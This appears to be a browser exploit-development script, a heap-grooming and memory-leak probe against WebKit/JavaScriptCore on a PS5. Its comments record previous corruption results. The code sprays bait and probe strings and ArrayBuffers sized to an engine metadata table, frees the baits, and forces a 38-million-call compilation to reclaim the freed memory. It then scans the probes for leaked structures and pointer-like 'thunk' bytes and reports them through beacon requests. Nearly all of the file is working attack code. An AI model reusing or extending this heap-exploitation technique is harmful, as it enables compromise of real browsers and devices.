// p384 - ArrayBuffer bait-and-switch + extended string scan
//
// V383 result: m_length corrupted (100000->79800) but charData CLEAN in first 1000.
// FINDINGS:
//   1. StringImpl uses IsoHeap (DECLARE_ALLOCATOR_WITH_HEAP_IDENTIFIER) - different pages from MetaTable
//   2. Scan window too small (1000 of 79800 chars)
//   3. Gigacage DISABLED on PS5/FreeBSD - AB backing stores in regular FastMalloc, SAME heap as MetaTable
//
// This probe does TWO things:
//   A. Extended string scan: check every 112th char position across full length
//   B. ArrayBuffer bait-and-switch: main-thread ABs through FastMalloc
//
// AB bait-and-switch:
//   - Allocate 20 bait ABs (100112 bytes each = exact MetaTable size)
//   - Allocate 10 probe ABs (100112 bytes each)
//   - Fill probe ABs with 0x50 pattern
//   - Transfer bait ABs (detach+free) via MessageChannel
//   - GC pressure
//   - Compile 38M op_calls -> MetaTable fills bait hole
//   - Scan probe ABs for non-0x50 bytes at stride 112 offsets
//
// Beacon prefix: V384-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V384-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {
      try { new Image().src = '/beacon/V384-' + tag + '?t=' + Date.now(); } catch(e2) {}
    }
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  // === PART A: Extended string scan (reuse V383 approach but scan more) ===
  var workerCode = function() {
    var probes = [];
    var baseUrl = '';
    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V384-W-' + tag + '?t=' + Date.now(), false);
        x.send('');
      } catch(e) {}
    }
    function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') { baseUrl = e.data.baseUrl; beacon('ALIVE'); return; }

      if (e.data.cmd === 'alloc') {
        var baits = [];
        for (var i = 0; i < 20; i++) {
          var b = '';
          for (var j = 0; j < 100; j++) b += 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
          b = b.substring(0, 100000);
          b.charCodeAt(0);
          baits.push(b);
        }
        beacon('BAIT-' + baits.length);

        for (var i = 0; i < 10; i++) {
          var p = '';
          for (var j = 0; j < 100; j++) p += 'PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP';
          p = p.substring(0, 100000);
          p.charCodeAt(0);
          probes.push(p);
        }
        beacon('PROBES-' + probes.length);

        for (var i = 0; i < baits.length; i++) baits[i] = null;
        baits = null;
        beacon('FREED');
        self.postMessage({ ready: true });
        return;
      }

      if (e.data.cmd === 'scan') {
        beacon('SCANNING');
        var hitCount = 0;

        for (var i = 0; i < probes.length; i++) {
          try {
            var p = probes[i];
            var len = p.length;
            if (len !== 100000) beacon('P' + i + '-LEN-' + len);

            var useLen = Math.min(len, 100000);
            var nonP = 0;
            var firstHit = -1;

            // Extended scan: check at EVERY 112-byte stride offset
            // Within each stride, writes at +12,+24,+64,+68 relative to entry start
            // We scan at ALL positions in the first 10000 chars
            var scanLen = Math.min(useLen, 10000);
            for (var j = 0; j < scanLen; j++) {
              if (p.charCodeAt(j) !== 0x50) {
                nonP++;
                if (firstHit < 0) firstHit = j;
              }
            }

            if (nonP > 0) {
              hitCount++;
              beacon('P' + i + '-HIT-first' + firstHit + '-count' + nonP);

              // Dump 128 bytes around firstHit
              var ds = Math.max(0, firstHit - 16);
              var de = Math.min(useLen, ds + 128);
              var hex = '';
              for (var j = ds; j < de; j++) hex += hexByte(p.charCodeAt(j));
              for (var off = 0; off < hex.length; off += 60)
                beacon('P' + i + '-D' + (ds + off/2) + '-' + hex.substring(off, off + 60));

              // Look for 0xFF signature
              for (var j = firstHit; j < Math.min(useLen, firstHit + 2000); j++) {
                if (p.charCodeAt(j) === 0xFF && j + 3 < useLen &&
                    p.charCodeAt(j+1) === 0xFF && p.charCodeAt(j+2) === 0xFF && p.charCodeAt(j+3) === 0xFF) {
                  beacon('P' + i + '-SIG-' + j);
                  var thunk = '';
                  for (var k = j + 12; k < j + 20 && k < useLen; k++) thunk += hexByte(p.charCodeAt(k));
                  beacon('P' + i + '-THUNK-' + thunk);
                  break;
                }
              }

              // Full count in first 10000
              beacon('P' + i + '-TOTAL-nonP' + nonP + '-in' + scanLen);
            } else {
              // Also sample deeper positions at stride offsets
              var deepHits = 0;
              for (var stride = 0; stride < useLen; stride += 112) {
                for (var w = 0; w < 4; w++) {
                  var pos = stride + [12, 24, 64, 68][w];
                  if (pos < useLen && p.charCodeAt(pos) !== 0x50) {
                    deepHits++;
                    if (deepHits === 1) beacon('P' + i + '-DEEP1-pos' + pos + '-val' + p.charCodeAt(pos));
                  }
                }
              }
              beacon('P' + i + '-' + (deepHits > 0 ? 'DEEPHIT-' + deepHits : 'CLEAN'));
            }
          } catch(ex) {
            beacon('P' + i + '-CRASH-' + (ex.message || '').substring(0, 30));
          }
        }
        beacon('STR-HITS-' + hitCount);
        beacon('STR-DONE');
        self.postMessage({ done: true });
      }
    };
  };

  var workerBlob = new Blob(['(' + workerCode.toString() + ')()'], { type: 'application/javascript' });
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: location.protocol + '//' + location.host });

  // === PART B: ArrayBuffer bait-and-switch (main thread) ===
  var AB_SIZE = 100112; // exact MetaTable allocation size
  var abBaits = [];
  var abProbes = [];

  // Allocate bait ABs
  for (var i = 0; i < 20; i++) {
    abBaits.push(new ArrayBuffer(AB_SIZE));
  }
  B('AB-BAIT-' + abBaits.length);

  // Allocate probe ABs and fill with 0x50
  for (var i = 0; i < 10; i++) {
    var ab = new ArrayBuffer(AB_SIZE);
    var view = new Uint8Array(ab);
    for (var j = 0; j < AB_SIZE; j++) view[j] = 0x50;
    abProbes.push(ab);
  }
  B('AB-PROBE-' + abProbes.length);

  // Free bait ABs via transfer
  var mc = new MessageChannel();
  try {
    mc.port1.postMessage('x', abBaits);
    B('AB-TRANSFERRED');
  } catch(e) {
    // If transfer fails, try detaching via structuredClone
    try {
      for (var i = 0; i < abBaits.length; i++) {
        if (abBaits[i].byteLength > 0) {
          structuredClone(null, { transfer: [abBaits[i]] });
        }
      }
      B('AB-DETACHED');
    } catch(e2) {
      B('AB-FREE-FAIL-' + (e2.message || '').substring(0, 30));
    }
  }
  abBaits = null;
  mc.port1.close();
  mc.port2.close();

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');
      // GC pressure
      var gcR = 0;
      function gc() {
        for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
        for (var j = 0; j < 500; j++) new Array(100).fill(gcR);
        gcR++;
        if (gcR < 30) setTimeout(gc, 30);
        else { B('GC-' + gcR); build(); }
      }
      gc();
    }
    if (e.data.done) {
      // Now scan AB probes
      scanABProbes();
    }
  };

  worker.postMessage({ cmd: 'alloc' });

  function build() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var cc = 'a();'.repeat(CHUNK);
    var p = ['window.__p384fn=function(a){'];
    for (var c = 0; c < nC; c++) p.push(cc);
    p.push('a();'.repeat(rem));
    p.push('};window.__p384ok=true;');
    cc = null;
    var blob = new Blob(p, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    p = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__p384ok ? 'OK' : 'FAIL'));
      // Scan strings first, then ABs
      worker.postMessage({ cmd: 'scan' });
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }

  function scanABProbes() {
    B('AB-SCAN');
    var abHits = 0;

    for (var i = 0; i < abProbes.length; i++) {
      try {
        var ab = abProbes[i];
        if (!ab || ab.byteLength === 0) { B('AB' + i + '-DETACHED'); continue; }

        var view = new Uint8Array(ab);
        var nonP = 0;
        var firstHit = -1;

        // Scan first 10000 bytes
        var scanLen = Math.min(view.length, 10000);
        for (var j = 0; j < scanLen; j++) {
          if (view[j] !== 0x50) {
            nonP++;
            if (firstHit < 0) firstHit = j;
          }
        }

        if (nonP > 0) {
          abHits++;
          B('AB' + i + '-HIT-first' + firstHit + '-count' + nonP);

          // Dump around firstHit
          var ds = Math.max(0, firstHit - 8);
          var de = Math.min(view.length, ds + 128);
          var hex = '';
          for (var j = ds; j < de; j++) hex += hexByte(view[j]);
          for (var off = 0; off < hex.length; off += 60)
            B('AB' + i + '-D' + (ds + off/2) + '-' + hex.substring(off, off + 60));

          // Look for 0xFFFFFFFF signature
          for (var j = firstHit; j < Math.min(view.length, firstHit + 2000); j++) {
            if (view[j] === 0xFF && j + 3 < view.length &&
                view[j+1] === 0xFF && view[j+2] === 0xFF && view[j+3] === 0xFF) {
              B('AB' + i + '-SIG-' + j);
              // Thunk at sig+12
              var thunk = '';
              for (var k = j + 12; k < j + 20 && k < view.length; k++) thunk += hexByte(view[k]);
              B('AB' + i + '-THUNK-' + thunk);
              // bytecodeIndex at sig+56
              if (j + 59 < view.length) {
                var bci = view[j+56] | (view[j+57] << 8) | (view[j+58] << 16) | (view[j+59] << 24);
                B('AB' + i + '-BCI-' + bci);
              }
              // Check next sig at +112
              if (j + 115 < view.length) {
                var next = (view[j+112] === 0xFF && view[j+113] === 0xFF && view[j+114] === 0xFF && view[j+115] === 0xFF);
                B('AB' + i + '-NEXT-' + (next ? 'MATCH' : 'MISS'));
              }
              break;
            }
          }
        } else {
          // Deep scan at stride offsets
          var deepHits = 0;
          for (var stride = 0; stride < view.length; stride += 112) {
            var offsets = [12, 24, 64, 68];
            for (var w = 0; w < 4; w++) {
              var pos = stride + offsets[w];
              if (pos < view.length && view[pos] !== 0x50) {
                deepHits++;
                if (deepHits === 1) B('AB' + i + '-DEEP1-pos' + pos + '-val' + view[pos]);
              }
            }
          }
          B('AB' + i + '-' + (deepHits > 0 ? 'DEEPHIT-' + deepHits : 'CLEAN'));
        }
      } catch(ex) {
        B('AB' + i + '-ERR-' + (ex.message || '').substring(0, 30));
      }
    }

    B('AB-HITS-' + abHits);
    B('ALL-DONE');
  }
})();
